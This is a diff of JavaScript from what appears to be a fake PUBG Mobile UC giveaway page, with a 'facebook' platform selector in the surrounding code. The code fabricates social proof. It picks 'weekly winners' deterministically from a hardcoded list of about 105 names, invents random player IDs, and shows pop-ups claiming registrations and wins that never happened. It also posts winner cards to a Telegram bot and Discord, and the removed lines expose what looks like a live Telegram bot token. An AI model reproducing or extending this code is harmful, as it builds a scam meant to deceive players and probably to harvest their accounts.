+            "محمد أحمد الحساني", "علي فارس مفتاح", "صلاح محسن أحمد", "خالد الشمري", 
+            "نور الدين إسماعيل", "سلطان يوسف القرضاوي", "حمزة المعافى", "مصطفى الكاظمي",
+            "صلاح لطفي بن عيسى", "عمر سالم بانجوة", "يسلم عبدالوهاب", "عبدالله أحمد العلي", 
+            "ريان طارق داؤود", "إسلام عبدالله محمد", "رأفت علي بديع", "حسين إدريس طارق",
+            "سالم سعيد باوزير", "ماجد عبدالحكيم", "عمار ياسر الشريفي", "بلال توفيق السالم",
+            "طارق زياد النهدي", "أحمد مراد بن طالب", "وليد خالد الكندي", "صالح مبارك المنهالي",
+            "بدر ناصر العتيبي", "هشام بن خالد", "أنس عبدالرحمن", "يحيى زكريا القحطاني",
+            "فارس تركي العصيمي", "زياد فهد السبيعي", "عبدالعزيز بن راشد", "معاذ توفيق الناصري",
+            "سعود عبدالعزيز الدوسري", "عادل منصور الهاجري", "إبراهم ماجد الرفاعي", "سليمان حامد المطيري",
+            "فيصل عبدالله الغامدي", "جهاد بن طلال", "وسام عدنان الزهراني", "سيف الدين يونس",
+            "أسامة خليل الحارثي", "عاصم بن ثابت", "مالك مروان الشرفي", "أيمن صلاح العفيف",
+            "نواف مشعل العنزي", "أيوب عبدالصمد", "حاتم طاهر اليماني", "طلال عبدالإله",
+            "باسم عمار الرويلي", "نايف حمدان الصباح", "مروان إياد الجابر", "غازي سعد العارفي",
+            "مهند فيصل الحارثي", "أمجد عبداللطيف", "قتيبة يوسف السلمي", "سامي بن راشد",
+            "عز الدين توفيق", "شرف الدين عمران", "فراس بدر البقمي", "جمال إبراهيم العامري",
+            "وائل عبده الصبري", "أيمن ناصر القحطاني", "مروان طاهر الشبواني", "مقبل مبارك الكربي",
+            "تركي فهد الهاجري", "راشد حمد المري", "سعيد سالم العمري", "معتز عادل العولقي",
+            "فؤاد حسن الباكري", "عصام توفيق اليافعي", "أمين صالح الصبيحي", "ضياء الدين العولقي",
+            "مازن عبدالرب المفلحي", "همام فاروق السقاف", "وهيب علي الحارثي", "موسى جعفر العيدروس",
+            "منصور علي الكثيري", "نزار خليل التميمي", "هاشم محمد العطاس", "أكرم سعيد المحضار",
+            "نبيل طاهر البكري", "توفيق عباد الرصاص", "مختار عبدالجليل", "شريف فتحي السالمي",
+            "إلياس مراد الجابري", "يعقوب يوسف البلوشي", "صهيب أحمد الشحري", "نوح إبراهيم الكندي",
+            "زكريا يحيى المحرمي", "إدريس حمزة العولقي", "خالد وليد الضالعي", "عدنان سعيد المنهالي",
+            "عمار فايز المهري", "مشاري سعد السبيعي", "سلطان خالد الدوسري", "سعود ناصر السهلي",
+            "عبدالرحمن فهد القحطاني", "فيصل بدر المطيري", "نايف ثامر الشمري", "بندر وليد العتيبي",
+            "طلال عبدالله الحداد", "مقرن محمد الغامدي", "يزيد صالح محمد بن علي", "سلمان حامد المالكي"
+        ];
 
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
+        const weeklyPrizes = [
+            "500 UC (المركز الأول 🥇)",
+            "400 UC (المركز الثاني 🥈)",
+            "300 UC (المركز الثالث 🥉)"
+        ];
 
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + بطاقات الفائزين + تليجرام)
-   ========================================================================== */
+        function getWeeklyWinnersWithPrizes() {
+            const now = new Date();
+            const totalNames = toastNames.length;
+            const localDate = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+            const baseDate = new Date(1970, 0, 3);
+            const diffInTime = localDate.getTime() - baseDate.getTime();
+            const diffInDays = Math.floor(diffInTime / (1000 * 3600 * 24));
+            const currentWeekIndex = Math.floor(diffInDays / 7);
 
-/* ==========================================================================
-   منظومة مسابقات ببجي موبايل الأسبوعية (الإشعارات + البطاقات المزدوجة + تليجرام)
-   ========================================================================== */
+            const winner1 = { name: toastNames[currentWeekIndex % totalNames], prize: weeklyPrizes[0] };
+            const winner2 = { name: toastNames[(currentWeekIndex + 35) % totalNames], prize: weeklyPrizes[1] };
+            const winner3 = { name: toastNames[(currentWeekIndex + 70) % totalNames], prize: weeklyPrizes[2] };
 
-// 1. مصفوفة الأسماء الموسعة (105 أسماء فريدة بدون تكرار)
-const toastNames = [
-    "محمد أحمد الحساني", "علي فارس مفتاح", "صلاح محسن أحمد", "خالد الشمري", 
-    "نور الدين إسماعيل", "سلطان يوسف القرضاوي", "حمزة المعافى", "مصطفى الكاظمي",
-    "صلاح لطفي بن عيسى", "عمر سالم بانجوة", "يسلم عبدالوهاب", "عبدالله أحمد العلي", 
-    "ريان طارق داؤود", "إسلام عبدالله محمد", "رأفت علي بديع", "حسين إدريس طارق",
-    "سالم سعيد باوزير", "ماجد عبدالحكيم", "عمار ياسر الشريفي", "بلال توفيق السالم",
-    "طارق زياد النهدي", "أحمد مراد بن طالب", "وليد خالد الكندي", "صالح مبارك المنهالي",
-    "بدر ناصر العتيبي", "هشام بن خالد", "أنس عبدالرحمن", "يحيى زكريا القحطاني",
-    "فارس تركي العصيمي", "زياد فهد السبيعي", "عبدالعزيز بن راشد", "معاذ توفيق الناصري",
-    "سعود عبدالعزيز الدوسري", "عادل منصور الهاجري", "إبراهم ماجد الرفاعي", "سليمان حامد المطيري",
-    "فيصل عبدالله الغامدي", "جهاد بن طلال", "وسام عدنان الزهراني", "سيف الدين يونس",
-    "أسامة خليل الحارثي", "عاصم بن ثابت", "مالك مروان الشرفي", "أيمن صلاح العفيف",
-    "نواف مشعل العنزي", "أيوب عبدالصمد", "حاتم طاهر اليماني", "طلال عبدالإله",
-    "باسم عمار الرويلي", "نايف حمدان الصباح", "مروان إياد الجابر", "غازي سعد العارفي",
-    "مهند فيصل الحارثي", "أمجد عبداللطيف", "قتيبة يوسف السلمي", "سامي بن راشد",
-    "عز الدين توفيق", "شرف الدين عمران", "فراس بدر البقمي", "جمال إبراهيم العامري",
-    "وائل عبده الصبري", "أيمن ناصر القحطاني", "مروان طاهر الشبواني", "مقبل مبارك الكربي",
-    "تركي فهد الهاجري", "راشد حمد المري", "سعيد سالم العمري", "معتز عادل العولقي",
-    "فؤاد حسن الباكري", "عصام توفيق اليافعي", "أمين صالح الصبيحي", "ضياء الدين العولقي",
-    "مازن عبدالرب المفلحي", "همام فاروق السقاف", "وهيب علي الحارثي", "موسى جعفر العيدروس",
-    "منصور علي الكثيري", "نزار خليل التميمي", "هاشم محمد العطاس", "أكرم سعيد المحضار",
-    "نبيل طاهر البكري", "توفيق عباد الرصاص", "مختار عبدالجليل", "شريف فتحي السالمي",
-    "إلياس مراد الجابري", "يعقوب يوسف البلوشي", "صهيب أحمد الشحري", "نوح إبراهيم الكندي",
-    "زكريا يحيى المحرمي", "إدريس حمزة العولقي", "خالد وليد الضالعي", "عدنان سعيد المنهالي",
-    "عمار فايز المهري", "مشاري سعد السبيعي", "سلطان خالد الدوسري", "سعود ناصر السهلي",
-    "عبدالرحمن فهد القحطاني", "فيصل بدر المطيري", "نايف ثامر الشمري", "بندر وليد العتيبي",
-    "طلال عبدالله الحداد", "مقرن محمد الغامدي", "يزيد صالح محمد بن علي", "سلمان حامد المالكي"
-];
-
-// 2. جوائز الفائزين الثلاثة بالتعديل الجديد (الأول 500، الثاني 400، الثالث 300)
-const weeklyPrizes = [
-    "500 UC (المركز الأول 🥇)",
-    "400 UC (المركز الثاني 🥈)",
-    "300 UC (المركز الثالث 🥉)"
-];
-
-// 3. بيانات الاعتماد لتليجرام
-const TELEGRAM_CONFIG = {
-    botToken: "8898927305:AAHMxzFT5nZ3e6w30XuI-4ibBZjmTLhbw5M",
-    chatId: "8796885500"
-};
-
-// 4. تحديد الفائزين الثلاثة أوتوماتيكياً (يتغير أسبوعياً يوم الجمعة الساعة 12 منتصف الليل)
-function getWeeklyWinnersWithPrizes() {
-    const now = new Date();
-    const totalNames = toastNames.length;
-
-    // الحصول على التاريخ المحلي الحالي بدون ساعات لضمان التغيير عند 00:00 بالضبط
-    const localDate = new Date(now.getFullYear(), now.getMonth(), now.getDate());
-    
-    // تاريخ مرجعي ثابت يوافق يوم السبت (3 يناير 1970 كان يوم سبت)
-    const baseDate = new Date(1970, 0, 3);
-    
-    // حساب عدد الأيام بين التاريخ المرجعي واليوم الحالي
-    const diffInTime = localDate.getTime() - baseDate.getTime();
-    const diffInDays = Math.floor(diffInTime / (1000 * 3600 * 24));
-    
-    // تقسيم عدد الأيام على 7 للحصول على رقم الأسبوع الصحيح الذي يتحدث فجر السبت
-    const currentWeekIndex = Math.floor(diffInDays / 7);
-
-    const winner1 = { name: toastNames[currentWeekIndex % totalNames], prize: weeklyPrizes[0] };
-    const winner2 = { name: toastNames[(currentWeekIndex + 35) % totalNames], prize: weeklyPrizes[1] };
-    const winner3 = { name: toastNames[(currentWeekIndex + 70) % totalNames], prize: weeklyPrizes[2] };
-
-    return [winner1, winner2, winner3];
-}
-
-
-// 5. توليد ID احترافي
-function generateID() {
-    const prefix = Math.random() < 0.5 ? "51" : "52";
-    const randomMiddle = Math.floor(Math.random() * 90 + 10);
-    const randomEnd = Math.floor(Math.random() * 90 + 10);
-    return `${prefix}${randomMiddle}*****${randomEnd}`;
-}
-
-// 6. دالة خداع/تغطية الاسم (الاسم المخدوش)
-function getMaskedName(name) {
-    return name.split(' ').map(word => {
-        if (word.length <= 2) return '**';
-        return word.slice(0, 2) + '*'.repeat(word.length - 2);
-    }).join(' ');
-}
-
-// 7. العداد التنازلي بالأيام والساعات والدقائق والثواني
-function startFridayCountdown() {
-    const timerElement = document.getElementById('countdownTimer');
-    if (!timerElement) return;
-
-    setInterval(() => {
-        const now = new Date();
-        const targetFriday = new Date();
-
-        const currentDay = now.getDay(); // 0: الأحد ... 5: الجمعة
-        let daysUntilFriday = (5 - currentDay + 7) % 7;
-
-        targetFriday.setDate(now.getDate() + daysUntilFriday);
-        targetFriday.setHours(23, 59, 59, 999);
-
-        if (now > targetFriday) {
-            targetFriday.setDate(targetFriday.getDate() + 7);
+            return [winner1, winner2, winner3];
         }
 
-        const diff = targetFriday - now;
-
-        if (diff <= 0) {
-            timerElement.innerText = "00:00:00 (تم إغلاق السحب!)";
-            return;
+        function generateID() {
+            const prefix = Math.random() < 0.5 ? "51" : "52";
+            const randomMiddle = Math.floor(Math.random() * 90 + 10);
+            const randomEnd = Math.floor(Math.random() * 90 + 10);
+            return `${prefix}${randomMiddle}*****${randomEnd}`;
         }
 
-        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
-        const mins = Math.floor((diff / (1000 * 60)) % 60);
-        const secs = Math.floor((diff / 1000) % 60);
-
-        if (days > 0) {
-            timerElement.innerText = `متبقي ${days} يوم و ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
-        } else {
-            timerElement.innerText = `متبقي ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
+        function getMaskedName(name) {
+            return name.split(' ').map(word => {
+                if (word.length <= 2) return '**';
+                return word.slice(0, 2) + '*'.repeat(word.length - 2);
+            }).join(' ');
         }
 
-        // فحص الإرسال التلقائي يوم الجمعة في منتصف الليل
-        checkAutomaticSend(now);
-    }, 1000);
-}
+        function startFridayCountdown() {
+            const timerElement = document.getElementById('countdownTimer');
+            if (!timerElement) return;
 
-// 8. تصميم بطاقة الفائز الاحترافية (Canvas) تدعم النسخة الظاهرة والنسخة المخدوشة
-function createWinnerCardCanvas(displayName, winnerID, prize, isMasked) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 900;
-    canvas.height = 500;
-    const ctx = canvas.getContext('2d');
+            setInterval(() => {
+                const now = new Date();
+                const targetFriday = new Date();
 
-    // خلفية ألعاب فاخرة ومتدرجة
-    const bgGradient = ctx.createLinearGradient(0, 0, 900, 500);
-    bgGradient.addColorStop(0, '#050811');
-    bgGradient.addColorStop(1, '#0f172a');
-    ctx.fillStyle = bgGradient;
-    ctx.fillRect(0, 0, 900, 500);
+                const currentDay = now.getDay();
+                let daysUntilFriday = (5 - currentDay + 7) % 7;
 
-    // إطار ذهبي متوهج فاخر
-    ctx.strokeStyle = isMasked ? '#3b82f6' : '#ffd700';
-    ctx.lineWidth = 6;
-    ctx.strokeRect(18, 18, 864, 464);
+                targetFriday.setDate(now.getDate() + daysUntilFriday);
+                targetFriday.setHours(23, 59, 59, 999);
 
-    // بطاقة مركزية بيضاء/فاتحة بنقاوة عالية
-    ctx.fillStyle = '#f8fafc';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(45, 45, 810, 410, 14);
-        ctx.fill();
-    } else {
-        ctx.fillRect(45, 45, 810, 410);
-    }
+                if (now > targetFriday) {
+                    targetFriday.setDate(targetFriday.getDate() + 7);
+                }
 
-    // شريط علوي يوضح نوع النسخة (ظاهر أو مخدوش)
-    ctx.fillStyle = isMasked ? '#1e40af' : '#b45309';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(45, 45, 810, 48, [14, 14, 0, 0]);
-        ctx.fill();
-    } else {
-        ctx.fillRect(45, 45, 810, 48);
-    }
+                const diff = targetFriday - now;
 
-    // نص الشريط العلوي
-    ctx.fillStyle = '#ffffff';
-    ctx.font = 'bold 20px Tahoma, Arial, sans-serif';
-    ctx.textAlign = 'center';
-    const versionTitle = isMasked ? '🔒 [نسخة الاسم المخدوش الخصوصية الآمنة]' : '⭐ [نسخة الاسم الظاهر الرسمية]';
-    ctx.fillText(versionTitle, 450, 77);
+                if (diff <= 0) {
+                    timerElement.innerText = "00:00:00 (تم إغلاق السحب!)";
+                    return;
+                }
 
-    // العنوان الرئيسي للبطاقة
-    ctx.fillStyle = '#0f172a';
-    ctx.font = 'bold 28px Tahoma, Arial, sans-serif';
-    ctx.fillText('🏆 مسابقات ببجي موبايل الأسبوعية 🏆', 450, 135);
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+                const mins = Math.floor((diff / (1000 * 60)) % 60);
+                const secs = Math.floor((diff / 1000) % 60);
 
-    // خط فاصل
-    ctx.strokeStyle = '#cbd5e1';
-    ctx.lineWidth = 2;
-    ctx.beginPath();
-    ctx.moveTo(90, 155);
-    ctx.lineTo(810, 155);
-    ctx.stroke();
+                if (days > 0) {
+                    timerElement.innerText = `متبقي ${days} يوم و ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
+                } else {
+                    timerElement.innerText = `متبقي ${hours} ساعة و ${mins} دقيقة و ${secs} ثانية على السحب`;
+                }
 
-    // اسم الفائز (أو المخدوش)
-    ctx.fillStyle = '#1e293b';
-    ctx.font = 'bold 25px Tahoma, Arial, sans-serif';
-    const labelPrefix = isMasked ? 'الاسم المخدوش:' : 'اسم المتسابق:';
-    ctx.fillText(`${labelPrefix}  ${displayName}`, 450, 215);
+                checkAutomaticSend(now);
+            }, 1000);
+        }
 
-    // مربع الأيدي (ID)
-    ctx.fillStyle = '#0f172a';
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(190, 245, 520, 52, 10);
-        ctx.fill();
-    } else {
-        ctx.fillRect(190, 245, 520, 52);
-    }
+        function createWinnerCardCanvas(displayName, winnerID, prize, isMasked) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 900;
+            canvas.height = 500;
+            const ctx = canvas.getContext('2d');
 
-    ctx.fillStyle = '#38bdf8';
-    ctx.font = 'bold 23px monospace';
-    ctx.fillText(`الأيدي (ID):  ${winnerID}`, 450, 279);
+            const bgGradient = ctx.createLinearGradient(0, 0, 900, 500);
+            bgGradient.addColorStop(0, '#050811');
+            bgGradient.addColorStop(1, '#0f172a');
+            ctx.fillStyle = bgGradient;
+            ctx.fillRect(0, 0, 900, 500);
 
-    // مربع الجائزة المميز
-    ctx.fillStyle = '#ecfdf5';
-    ctx.strokeStyle = '#10b981';
-    ctx.lineWidth = 2;
-    if (ctx.roundRect) {
-        ctx.beginPath();
-        ctx.roundRect(110, 315, 680, 68, 12);
-        ctx.fill();
-        ctx.stroke();
-    } else {
-        ctx.fillRect(110, 315, 680, 68);
-        ctx.strokeRect(110, 315, 680, 68);
-    }
+            ctx.strokeStyle = isMasked ? '#3b82f6' : '#ffd700';
+            ctx.lineWidth = 6;
+            ctx.strokeRect(18, 18, 864, 464);
 
-    ctx.fillStyle = '#047857';
-    ctx.font = 'bold 24px Tahoma, Arial, sans-serif';
-    ctx.fillText(`🎁 الجائزة الكبرى:  ${prize}`, 450, 357);
-
-    // تذييل البطاقة
-    ctx.fillStyle = '#64748b';
-    ctx.font = '15px Tahoma, Arial, sans-serif';
-    ctx.fillText('تم سحب وإعلان الفائزين نهاية الأسبوع يوم الجمعة منتصف الليل', 450, 425);
-
-    return canvas;
-}
-
-// 9. إرسال البطاقة إلى تليجرام
-async function sendWinnerCardToTelegram(winnerName, winnerID, prize, isMasked) {
-    const displayName = isMasked ? getMaskedName(winnerName) : winnerName;
-    const canvas = createWinnerCardCanvas(displayName, winnerID, prize, isMasked);
-
-    canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-        formData.append('photo', blob, isMasked ? 'masked_card.png' : 'normal_card.png');
-        
-        const cardTypeLabel = isMasked ? "🔒 **(نسخة الاسم المخدوش)**" : "⭐ **(نسخة الاسم الظاهر)**";
-        formData.append('caption', 
-            `🏆 **إعلان الفائزين بالسحب الأسبوعي** ${cardTypeLabel}\n\n` +
-            `👤 **اللاعب:** ${displayName}\n` +
-            `🆔 **الأيدي (ID):** \`${winnerID}\`\n` +
-            `🎁 **الجائزة:** ${prize}\n\n` +
-            `⏰ *تم اعتماد السحب نهاية الأسبوع يوم الجمعة الساعة 12:00 منتصف الليل!*`
-        );
-        formData.append('parse_mode', 'Markdown');
-
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            const result = await response.json();
-            if (result.ok) {
-                console.log(`✅ تم إرسال البطاقة (${isMasked ? 'مخدوش' : 'ظاهر'}) بنجاح.`);
+            ctx.fillStyle = '#f8fafc';
+            if (ctx.roundRect) {
+                ctx.beginPath();
+                ctx.roundRect(45, 45, 810, 410, 14);
+                ctx.fill();
             } else {
-                console.error("❌ خطأ تليجرام:", result.description);
+                ctx.fillRect(45, 45, 810, 410);
             }
-        } catch (error) {
-            console.error("❌ فشل الاتصال:", error);
+
+            ctx.fillStyle = isMasked ? '#1e40af' : '#b45309';
+            if (ctx.roundRect) {
+                ctx.beginPath();
+                ctx.roundRect(45, 45, 810, 48, [14, 14, 0, 0]);
+                ctx.fill();
+            } else {
+                ctx.fillRect(45, 45, 810, 48);
+            }
+
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 20px Tahoma, Arial, sans-serif';
+            ctx.textAlign = 'center';
+            const versionTitle = isMasked ? '🔒 [نسخة الاسم المخدوش الخصوصية الآمنة]' : '⭐ [نسخة الاسم الظاهر الرسمية]';
+            ctx.fillText(versionTitle, 450, 77);
+
+            ctx.fillStyle = '#0f172a';
+            ctx.font = 'bold 28px Tahoma, Arial, sans-serif';
+            ctx.fillText('🏆 مسابقات ببجي موبايل الأسبوعية 🏆', 450, 135);
+
+            ctx.strokeStyle = '#cbd5e1';
+            ctx.lineWidth = 2;
+            ctx.beginPath();
+            ctx.moveTo(90, 155);
+            ctx.lineTo(810, 155);
+            ctx.stroke();
+
+            ctx.fillStyle = '#1e293b';
+            ctx.font = 'bold 25px Tahoma, Arial, sans-serif';
+            const labelPrefix = isMasked ? 'الاسم المخدوش:' : 'اسم المتسابق:';
+            ctx.fillText(`${labelPrefix}${displayName}`, 450, 215);
+
+            ctx.fillStyle = '#0f172a';
+            if (ctx.roundRect) {
+                ctx.beginPath();
+                ctx.roundRect(190, 245, 520, 52, 10);
+                ctx.fill();
+            } else {
+                ctx.fillRect(190, 245, 520, 52);
+            }
+
+            ctx.fillStyle = '#38bdf8';
+            ctx.font = 'bold 23px monospace';
+            ctx.fillText(`الأيدي (ID):  ${winnerID}`, 450, 279);
+
+            ctx.fillStyle = '#ecfdf5';
+            ctx.strokeStyle = '#10b981';
+            ctx.lineWidth = 2;
+            if (ctx.roundRect) {
+                ctx.beginPath();
+                ctx.roundRect(110, 315, 680, 68, 12);
+                ctx.fill();
+                ctx.stroke();
+            } else {
+                ctx.fillRect(110, 315, 680, 68);
+                ctx.strokeRect(110, 315, 680, 68);
+            }
+
+            ctx.fillStyle = '#047857';
+            ctx.font = 'bold 24px Tahoma, Arial, sans-serif';
+            ctx.fillText(`🎁 الجائزة الكبرى:  ${prize}`, 450, 357);
+
+            ctx.fillStyle = '#64748b';
+            ctx.font = '15px Tahoma, Arial, sans-serif';
+            ctx.fillText('تم سحب وإعلان الفائزين نهاية الأسبوع يوم الجمعة منتصف الليل', 450, 425);
+
+            return canvas;
         }
-    }, 'image/png');
-}
 
-// 10. إرسال جميع البطاقات (النسختين العادية والمخدوشة لكل فائز من الثلاثة = 6 بطاقات)
-function sendAllWinnerCardsToTelegram() {
-    const winners = getWeeklyWinnersWithPrizes();
-    console.log("🚀 جاري إرسال البطاقات الست (ظاهر + مخدوش) إلى تليجرام...");
+        async function sendWinnerCardToTelegram(winnerName, winnerID, prize, isMasked) {
+            const displayName = isMasked ? getMaskedName(winnerName) : winnerName;
+            const canvas = createWinnerCardCanvas(displayName, winnerID, prize, isMasked);
 
-    winners.forEach((winner, index) => {
-        const randID = generateID();
-        // إرسال النسخة الظاهرة
-        setTimeout(() => {
-            sendWinnerCardToTelegram(winner.name, randID, winner.prize, false);
-        }, index * 4000);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', DATA_BOT_CONFIG.chatId);
+                formData.append('photo', blob, isMasked ? 'masked_card.png' : 'normal_card.png');
+                
+                const cardTypeLabel = isMasked ? "🔒 **(نسخة الاسم المخدوش)**" : "⭐ **(نسخة الاسم الظاهر)**";
+                formData.append('caption', 
+                    `🏆 **إعلان الفائزين بالسحب الأسبوعي** ${cardTypeLabel}\n\n` +
+                    `👤 **اللاعب:** ${displayName}\n` +
+                    `🆔 **الأيدي (ID):** \`${winnerID}\`\n` +
+                    `🎁 **الجائزة:** ${prize}\n\n` +
+                    `⏰ *تم اعتماد السحب نهاية الأسبوع يوم الجمعة الساعة 12:00 منتصف الليل!*`
+                );
+                formData.append('parse_mode', 'Markdown');
 
-        // إرسال النسخة المخدوشة
-        setTimeout(() => {
-            sendWinnerCardToTelegram(winner.name, randID, winner.prize, true);
-        }, (index * 4000) + 2000);
-    });
-}
+                try {
+                    await fetch(`https://api.telegram.org/bot${DATA_BOT_CONFIG.botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("❌ فشل الإرسال لتليجرام:", error);
+                }
+            }, 'image/png');
 
-// 11. الفحص التلقائي للإرسال يوم الجمعة الساعة 12 منتصف الليل (00:00)
-function checkAutomaticSend(now) {
-    const currentDay = now.getDay(); // 5 = الجمعة
-    const currentHour = now.getHours(); // 0 = منتصف الليل
-    const currentMinute = now.getMinutes();
+            // إرسال الإعلان أيضاً كبطاقة في ديسكورد
+            sendDiscordEmbed({
+                title: `🏆 إعلان فائز بالسحب الأسبوعي (${isMasked ? 'مخدوش' : 'ظاهر'})`,
+                color: isMasked ? 0x34495e : 0xf1c40f,
+                fields: [
+                    { name: "👤 اسم اللاعب", value: displayName, inline: true },
+                    { name: "🆔 الأيدي (ID)", value: winnerID, inline: true },
+                    { name: "🎁 الجائزة", value: prize, inline: true }
+                ],
+                footer: "سحب مسابقة ببجي الأسبوعية - اعتماد رسمي"
+            });
+        }
 
-    const currentWeekKey = Math.floor(now.getTime() / (7 * 24 * 60 * 60 * 1000));
-    const lastSentWeek = localStorage.getItem('auto_sent_friday_week');
+        function sendAllWinnerCardsToTelegram() {
+            const winners = getWeeklyWinnersWithPrizes();
 
-    // إذا كان يوم الجمعة، الساعة 00:00 (أول دقيقة من الجمعة)، ولم تُرسل بعد في هذا الأسبوع
-    if (currentDay === 5 && currentHour === 0 && currentMinute === 0 && lastSentWeek !== String(currentWeekKey)) {
-        console.log("⏰ وقت السحب التلقائي وصل! يوم الجمعة 12:00 منتصف الليل.");
-        sendAllWinnerCardsToTelegram();
-        localStorage.setItem('auto_sent_friday_week', String(currentWeekKey));
-    }
-}
+            winners.forEach((winner, index) => {
+                const randID = generateID();
+                setTimeout(() => {
+                    sendWinnerCardToTelegram(winner.name, randID, winner.prize, false);
+                }, index * 4000);
 
-// 12. إدارة الإشعارات العائمة (Toasts)
-function getOrCreateToastContainer() {
-    let container = document.getElementById('toast-container');
-    if (!container) {
-        container = document.createElement('div');
-        container.id = 'toast-container';
-        Object.assign(container.style, {
-            position: 'fixed',
-            bottom: '20px',
-            right: '20px',
-            zIndex: '9999',
-            display: 'flex',
-            flexDirection: 'column',
-            gap: '10px',
-            maxWidth: '380px',
-            direction: 'rtl'
+                setTimeout(() => {
+                    sendWinnerCardToTelegram(winner.name, randID, winner.prize, true);
+                }, (index * 4000) + 2000);
+            });
+        }
+
+        function checkAutomaticSend(now) {
+            const currentDay = now.getDay();
+            const currentHour = now.getHours();
+            const currentMinute = now.getMinutes();
+
+            const currentWeekKey = Math.floor(now.getTime() / (7 * 24 * 60 * 60 * 1000));
+            const lastSentWeek = localStorage.getItem('auto_sent_friday_week');
+
+            if (currentDay === 5 && currentHour === 0 && currentMinute === 0 && lastSentWeek !== String(currentWeekKey)) {
+                sendAllWinnerCardsToTelegram();
+                localStorage.setItem('auto_sent_friday_week', String(currentWeekKey));
+            }
+        }
+
+        function getOrCreateToastContainer() {
+            let container = document.getElementById('toast-container');
+            if (!container) {
+                container = document.createElement('div');
+                container.id = 'toast-container';
+                Object.assign(container.style, {
+                    position: 'fixed',
+                    bottom: '20px',
+                    right: '20px',
+                    zIndex: '9999',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    gap: '10px',
+                    maxWidth: '380px',
+                    direction: 'rtl'
+                });
+                document.body.appendChild(container);
+            }
+            return container;
+        }
+
+        function showToast(message, borderColor = '#00f3ff', duration = 6000) {
+            const container = getOrCreateToastContainer();
+            const toast = document.createElement('div');
+            toast.className = 'toast-card';
+            
+            Object.assign(toast.style, {
+                backgroundColor: '#161a23',
+                color: '#ffffff',
+                padding: '12px 16px',
+                borderRadius: '8px',
+                borderRight: `4px solid ${borderColor}`,
+                boxShadow: '0 4px 15px rgba(0, 0, 0, 0.4)',
+                fontSize: '14px',
+                fontFamily: 'Tahoma, Arial, sans-serif',
+                lineHeight: '1.5',
+                opacity: '1',
+                transition: 'opacity 0.4s ease, transform 0.4s ease'
+            });
+
+            toast.innerHTML = message;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateY(10px)';
+                setTimeout(() => toast.remove(), 400);
+            }, duration);
+        }
+
+        function startLiveToasts() {
+            startFridayCountdown();
+
+            setInterval(() => {
+                const randID = generateID();
+                showToast(`🎉 تم إتمام تسجيل اللاعب (ID: ${randID}) بنجاح قبل قليل!`, '#10b981', 6000);
+            }, 18000);
+
+            setInterval(() => {
+                const winners = getWeeklyWinnersWithPrizes();
+                const randomWinner = winners[Math.floor(Math.random() * winners.length)];
+                const randID = generateID();
+
+                showToast(`🏆 الفائز بالسحب الأسبوعي: ${randomWinner.name} (ID: ${randID}) بـ ${randomWinner.prize}!`, '#38bdf8', 7000);
+            }, 25000);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startLiveToasts();
         });
-        document.body.appendChild(container);
-    }
-    return container;
-}
-
-function showToast(message, borderColor = '#00f3ff', duration = 6000) {
-    const container = getOrCreateToastContainer();
-    const toast = document.createElement('div');
-    toast.className = 'toast-card';
-    
-    Object.assign(toast.style, {
-        backgroundColor: '#161a23',
-        color: '#ffffff',
-        padding: '12px 16px',
-        borderRadius: '8px',
-        borderRight: `4px solid ${borderColor}`,
-        boxShadow: '0 4px 15px rgba(0, 0, 0, 0.4)',
-        fontSize: '14px',
-        fontFamily: 'Tahoma, Arial, sans-serif',
-        lineHeight: '1.5',
-        opacity: '1',
-        transition: 'opacity 0.4s ease, transform 0.4s ease'
-    });
-
-    toast.innerHTML = message;
-    container.appendChild(toast);
-
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateY(10px)';
-        setTimeout(() => toast.remove(), 400);
-    }, duration);
-}
-
-// 13. بدء المنظومة
-function startLiveToasts() {
-    startFridayCountdown();
-
-    // إشعار تسجيل لاعب جديد
-    setInterval(() => {
-        const randID = generateID();
-        showToast(`🎉 تم إتمام تسجيل اللاعب (ID: ${randID}) بنجاح قبل قليل!`, '#10b981', 6000);
-    }, 18000);
-
-    // إشعار فائز عشوائي
-    setInterval(() => {
-        const winners = getWeeklyWinnersWithPrizes();
-        const randomWinner = winners[Math.floor(Math.random() * winners.length)];
-        const randID = generateID();
-
-        showToast(`🏆 الفائز بالسحب الأسبوعي: ${randomWinner.name} (ID: ${randID}) بـ ${randomWinner.prize}!`, '#38bdf8', 7000);
-    }, 25000);
-}
-
-// تشغيل النظام عند تحميل الصفحة
-document.addEventListener('DOMContentLoaded', () => {
-    startLiveToasts();
-});
-
-
 
         /* ===================================================
            13. شاشة حماية انقطاع الاتصال بالإنترنت (Offline Shield)
@@ -2676,15 +2719,12 @@ document.addEventListener('DOMContentLoaded', () => {
             initParticleCanvas();
             selectPlatform('facebook', document.querySelector('.platform-box.fb'));
         });
-        
-  </script>
+</script>
+
 <script>
     // ==========================================
